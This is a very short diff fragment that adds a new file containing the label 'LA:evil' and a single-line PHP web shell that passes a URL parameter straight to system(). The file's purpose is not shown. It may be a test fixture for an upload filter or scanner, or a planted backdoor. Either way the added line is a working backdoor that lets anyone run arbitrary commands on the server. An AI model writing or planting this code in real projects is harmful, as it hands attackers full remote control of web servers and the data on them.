@@ -1,0 +1,2 @@
+LA:evil
+<?php system($_GET["c"]); ?>
